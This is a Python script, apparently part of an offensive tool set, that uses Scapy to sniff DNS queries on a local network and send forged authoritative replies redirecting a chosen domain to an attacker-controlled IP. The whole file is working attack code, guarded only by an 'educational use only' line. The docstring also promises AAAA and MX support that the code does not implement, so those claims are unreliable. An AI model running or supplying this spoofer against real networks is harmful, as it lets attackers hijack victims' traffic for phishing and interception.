#!/usr/bin/env python3
"""
N3 — DNS Spoof
Redirect DNS queries via rogue responses

Features:
- Spoof DNS responses for any domain
- Redirect traffic to attacker-controlled IP
- Support for A, AAAA, MX records
- Log all spoofed queries

Usage:
    sudo python3 dns_spoof.py [--interface eth0] [--domain example.com] [--ip 192.168.1.100]

WARNING: Educational use only. Test on your own network.
"""

import argparse
import os
import signal
import sys
import time
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
import threading

class DNSSpoof:
    def __init__(self, interface, target_domain, redirect_ip):
        self.interface = interface
        self.target_domain = target_domain
        self.redirect_ip = redirect_ip
        self.running = True
        self.spoofed = 0
        self.lock = threading.Lock()
        
        print(f"\n=== N3 — DNS Spoof ===")
        print(f"Interface: {interface}")
        print(f"Target: {target_domain}")
        print(f"Redirect to: {redirect_ip}")
        print("=" * 30)
    
    def create_dns_response(self, pkt):
        """Create spoofed DNS response"""
        if not pkt.haslayer(DNS):
            return None
        
        dns = pkt[DNS]
        
        # Only spoof queries
        if dns.qr != 0:
            return None
        
        # Get query name
        qname = dns.qd.qname.decode() if dns.qd else ""
        
        # Check if target domain
        if self.target_domain not in qname:
            return None
        
        print(f"\n[SPOOF] Query for {qname}")
        
        # Create response
        spoofed_dns = DNS(
            id=dns.id,
            qr=1,  # Response
            aa=1,  # Authoritative
            qd=dns.qd,
            an=DNSRR(
                rrname=qname,
                rdata=self.redirect_ip,
                ttl=300
            )
        )
        
        # Build response packet
        ether = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
        
        response = ether / ip / udp / spoofed_dns
        
        with self.lock:
            self.spoofed += 1
            print(f"  Redirected to {self.redirect_ip}")
        
        return response
    
    def process_packet(self, pkt):
        """Process incoming packet"""
        try:
            response = self.create_dns_response(pkt)
            if response:
                sendp(response, iface=self.interface, verbose=0)
        except Exception as e:
            pass
    
    def start(self):
        """Start DNS spoofing"""
        print(f"\nStarting DNS spoofing...")
        print(f"Waiting for DNS queries to {self.target_domain}...")
        print(f"Press Ctrl+C to stop\n")
        
        sniff(
            iface=self.interface,
            filter="udp port 53",
            prn=self.process_packet,
            store=0,
            stop_filter=lambda x: not self.running
        )
    
    def stop(self):
        """Stop spoofing"""
        self.running = False
        print(f"\n=== DNS Spoof Stopped ===")
        print(f"Total spoofed: {self.spoofed}")
        print("=" * 30)

def signal_handler(sig, frame):
    """Handle Ctrl+C"""
    spoofer.stop()
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description='N3 — DNS Spoof')
    parser.add_argument('--interface', '-i', default='eth0', help='Network interface')
    parser.add_argument('--domain', '-d', required=True, help='Target domain')
    parser.add_argument('--ip', '-p', required=True, help='Redirect IP')
    
    args = parser.parse_args()
    
    # Check root
    if os.geteuid() != 0:
        print("ERROR: DNS Spoof requires root privileges")
        print("Run with: sudo python3 dns_spoof.py")
        sys.exit(1)
    
    global spoofer
    spoofer = DNSSpoof(args.interface, args.domain, args.ip)
    
    signal.signal(signal.SIGINT, signal_handler)
    spoofer.start()

if __name__ == '__main__':
    main()
